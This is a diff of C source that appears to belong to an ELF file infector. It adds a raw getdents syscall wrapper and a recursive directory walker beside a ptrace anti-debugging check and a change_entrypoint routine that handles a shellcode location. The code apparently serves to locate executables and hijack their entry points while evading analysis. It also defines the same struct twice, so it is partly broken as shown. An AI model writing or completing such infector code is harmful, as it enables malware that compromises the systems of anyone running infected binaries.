@@ -54,15 +54,22 @@ typedef struct temp_Elf64_Ehdr{
   Elf64_Half    e_shstrndx;             /* Section header string table index */
 } temp_Elf64_Ehdr;//Elf64_Ehdr;
 
+struct linux_dirent {
+   long           d_ino;
+   off_t          d_off;
+   unsigned short d_reclen;
+   char           d_name[];
+};
+
+struct linux_dirent {
+   long           d_ino;
+   off_t          d_off;
+   unsigned short d_reclen;
+   char           d_name[];
+};
 
 
-void my_memcpy(char* d, char* s, int l){
-    int i=0;
-    while(l--){
-        d[i]=s[i];
-        i++;
-    }
-}
+
 
 static inline int my_access(const char *fpath, int flag){
 	/*
@@ -123,6 +130,32 @@ static inline int my_lseek(int fd, int offset, int origin){
    return ret;
 }
 
+static inline int my_getdent(int fd, struct linux_dirent *dirent, int count){
+    long long ret;
+    asm("mov %0, %%rdi"::"r"((long long)fd));
+    asm("mov %0, %%rsi"::"r"((long long)dirent));
+    asm("mov %0, %%rdx"::"r"((long long)count));
+    asm("mov $78,%rax");
+    asm("syscall");
+    asm("mov %%rax, %0":"=r"(ret));
+    return ret;
+}
+
+
+void my_memcpy(char* d, char* s, int l){
+    int i=0;
+    while(l--){
+        d[i]=s[i];
+        i++;
+    }
+}
+
+int my_strlen(const char *str){
+   int i=0;
+   while(1) if(str[i++]=='\x0') break;
+   return i-1;
+}
+
 int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long)request));
@@ -134,6 +167,62 @@ int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data){
    asm("mov %%rax, %0":"=r"(ret));
    return ret; // under debugging : -? / normal : 0
 }
+
+int my_strcmp(char *str1, char *str2) {
+  for (;*str1 && *str1 == *str2; str2++) str1++;
+  return *str1 - *str2;
+}
+
+void listdir(const char *dirname){
+    int nread = 0;
+    int dirname_len = my_strlen(dirname);
+    int d_name_len;
+    int fd = my_open(dirname, O_RDONLY | O_DIRECTORY);
+    struct linux_dirent *d;
+    int bpos = 0;
+    char d_type;
+    char buf[100000];
+    char subdir[4096+1]; // PATH_MAX
+    char subfile[4096+1]; // PATH_MAX
+    char dot[2] = {'.', 0};
+    char dotdot[3] = {'.', '.', 0};
+    char slash[2] = {'/', 0};
+       for ( ; ; ) {
+        nread = my_getdent(fd,(struct linux_dirent *)buf, 100000);
+        //printf("nread : %d\n",nread);
+        if (nread <= 0) break;
+
+        for (bpos = 0; bpos < nread;) {
+            d = (struct linux_dirent*) (buf + bpos);
+            d_type = *(buf + bpos + d->d_reclen - 1);
+            d_name_len = my_strlen(d->d_name);
+            bpos += d->d_reclen;
+            //printf("%s\n",d->d_name);
+            my_memcpy(subfile,dirname,dirname_len);
+            my_memcpy(subfile + dirname_len, slash, 1);
+            my_memcpy(subfile + dirname_len + 1 ,d->d_name,d_name_len+1);
+            printf("whole path??? %s\n",subfile);
+            if(d->d_ino && my_strcmp(d->d_name, dot) && my_strcmp(d->d_name, dotdot))
+            {
+                if(d_type == DT_DIR) // if directory
+                {
+                    //printf("%s/%s\n",dirname, d->d_name);
+                    my_memcpy(subdir, dirname, dirname_len);
+                    //printf("***subdir : %s\n",subdir); 
+                    my_memcpy(subdir + dirname_len, slash, 1);
+                    //printf("***subdir : %s\n",subdir);
+                    my_memcpy(subdir + dirname_len + 1, d->d_name, d_name_len+1);
+                    //printf("***subdir : %s\n",subdir);
+                    listdir(subdir);
+                }
+            }
+        }
+    }
+}
+
+
+
+
 
 void change_entrypoint(const char* fpath){
 	int fd, i, shellcodeloc;
